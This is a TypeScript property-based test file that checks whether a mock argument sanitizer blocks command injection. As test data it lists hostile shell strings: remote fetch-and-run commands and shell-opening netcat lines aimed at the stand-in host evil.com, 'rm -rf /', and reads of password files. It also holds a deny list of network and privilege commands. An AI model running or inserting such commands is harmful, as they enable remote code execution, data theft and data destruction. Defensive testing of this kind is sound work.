import * as fc from 'fast-check';
import { describe, it, expect } from 'vitest';
import {
  SecurityArbitraries,
  SecurityTestPatterns,
  SecurityValidators,
  ATTACK_PATTERNS,
  SecurityMockFactory
} from './utils/security-test-helpers.js';

/**
 * Tests for command injection prevention in adapter modules
 * These tests verify that the library safely handles potentially malicious command arguments
 */
describe('Command Injection Prevention Tests', () => {
  describe('Argument Sanitization', () => {
    it('should safely handle shell metacharacters in arguments', () => {
      fc.assert(
        fc.property(
          fc.string().filter(s => s.length > 0),
          SecurityArbitraries.controlCharacters(),
          (baseString, dangerousChar) => {
            const maliciousArg = baseString + dangerousChar + 'rm -rf /';
            
            try {
              const processedArg = sanitizeCommandArgument(maliciousArg);
              
              // Verify dangerous patterns are handled
              expect(SecurityValidators.hasCommandInjection(processedArg)).toBe(false);
              
              return true;
            } catch (error) {
              // If sanitization rejects the input, that's acceptable
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 200 }
      );
    });

    it('should handle command substitution attempts', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('command_injection'),
          (pattern) => {
            try {
              const processedArg = sanitizeCommandArgument(pattern);
              
              // Command substitution should be neutralized
              expect(SecurityValidators.hasCommandInjection(processedArg)).toBe(false);
              
              return true;
            } catch (error) {
              // Rejection is acceptable
              expect(error).toBeInstanceOf(Error);
              return true;
            }
          }
        ),
        { numRuns: 100 }
      );
    });

    it('should handle path traversal in command arguments', () => {
      fc.assert(
        fc.property(
          SecurityArbitraries.maliciousString('path_traversal'),
          (path) => {
            try {
              const processedArg = sanitizeCommandArgument(path);
              
              // Paths should be sanitized or contained
              expect(processedArg).toBeDefined();
              expect(SecurityValidators.hasPathTraversal(processedArg)).toBe(false);
            
            return true;
          } catch (error) {
            // Path rejection is acceptable
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Environment Variable Injection', () => {
    it('should handle environment variable manipulation attempts', () => {
      const envVarPatterns = [
        'PATH=/tmp:$PATH',
        'LD_PRELOAD=/tmp/malicious.so',
        'DYLD_INSERT_LIBRARIES=/tmp/malicious.dylib',
        'PYTHONPATH=/tmp/malicious',
        'NODE_PATH=/tmp/malicious',
        'HOME=/tmp',
        'SHELL=/bin/bash',
        'USER=root',
        'LANG=C.UTF-8; rm -rf /'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...envVarPatterns), (envVar) => {
          try {
            const processedArg = sanitizeCommandArgument(envVar);
            
            // Environment variable assignments should be handled safely
            expect(processedArg).toBeDefined();
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('File Descriptor Manipulation', () => {
    it('should handle file descriptor redirection attempts', () => {
      const fdRedirectionPatterns = [
        '> /etc/passwd',
        '>> /var/log/auth.log',
        '< /dev/zero',
        '2> /dev/null',
        '&> /tmp/output',
        '1>&2',
        '2>&1',
        '0< /etc/shadow',
        '| tee /tmp/output',
        '| nc evil.com 9999'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...fdRedirectionPatterns), (redirect) => {
          const maliciousCmd = 'dot ' + redirect;
          
          try {
            const processedArg = sanitizeCommandArgument(redirect);
            
            // Redirection should be neutralized
            expect(processedArg).not.toMatch(/[>&<|]/);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Network-based Attacks', () => {
    it('should handle network command injection attempts', () => {
      const networkPatterns = [
        'curl http://evil.com/payload | sh',
        'wget -O - http://evil.com/script | bash',
        'nc -l -p 9999 -e /bin/sh',
        'telnet evil.com 9999',
        'ssh user@evil.com "rm -rf /"',
        'ftp -n evil.com',
        'nslookup $(whoami).evil.com',
        'ping -c 1 evil.com && rm -rf /',
        'dig @evil.com malicious-query'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...networkPatterns), (netCmd) => {
          try {
            const processedArg = sanitizeCommandArgument(netCmd);
            
            // Network commands should be neutralized
            expect(processedArg).not.toMatch(/curl\s+http/);
            expect(processedArg).not.toMatch(/wget\s+.*http/);
            expect(processedArg).not.toMatch(/nc\s+-l/);
            expect(processedArg).not.toMatch(/ssh\s+.*@/);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });

  describe('Process Control Injection', () => {
    it('should handle process control attempts', () => {
      const processControlPatterns = [
        'kill -9 $$',
        'killall -9 node',
        'pkill -f graphviz',
        'sudo rm -rf /',
        'su root -c "rm -rf /"',
        'chmod 777 /etc/passwd',
        'chown root:root /tmp/malicious',
        'mount /dev/sda1 /mnt',
        'umount /home',
        'reboot',
        'halt',
        'poweroff'
      ];

      fc.assert(
        fc.property(fc.constantFrom(...processControlPatterns), (procCmd) => {
          try {
            const processedArg = sanitizeCommandArgument(procCmd);
            
            // Process control commands should be neutralized
            expect(processedArg).not.toMatch(/kill\s+-?\d+/);
            expect(processedArg).not.toMatch(/sudo\s+/);
            expect(processedArg).not.toMatch(/su\s+root/);
            expect(processedArg).not.toMatch(/chmod\s+\d+/);
            
            return true;
          } catch (error) {
            expect(error).toBeInstanceOf(Error);
            return true;
          }
        }),
        { numRuns: 50 }
      );
    });
  });
});

/**
 * Mock sanitization function for testing purposes
 * In the actual implementation, this would be part of the adapter modules
 */
function sanitizeCommandArgument(arg: string): string {
  // This is a simplified example - real implementation would be more sophisticated
  if (!arg || typeof arg !== 'string') {
    throw new Error('Invalid argument');
  }

  // Check for dangerous patterns
  const dangerousPatterns = [
    /[;&|`$(){}]/,           // Shell metacharacters
    /\$\(/,                  // Command substitution
    /`[^`]*`/,              // Backtick command substitution
    /[><|]/,                // Redirection
    /(rm\s+-rf|del\s+\/[sq])/i, // Destructive commands
    /(curl|wget|nc|ssh)\s+/i,    // Network commands
    /(sudo|su\s+root)/i,         // Privilege escalation
    /\.\.\//,                    // Path traversal
    /\/etc\/|\/bin\/|\/usr\/bin\//  // System paths
  ];

  for (const pattern of dangerousPatterns) {
    if (pattern.test(arg)) {
      throw new Error(`Potentially dangerous argument: ${arg}`);
    }
  }

  // Basic escaping for remaining characters
  return arg.replace(/["'\\]/g, '\\$&');
}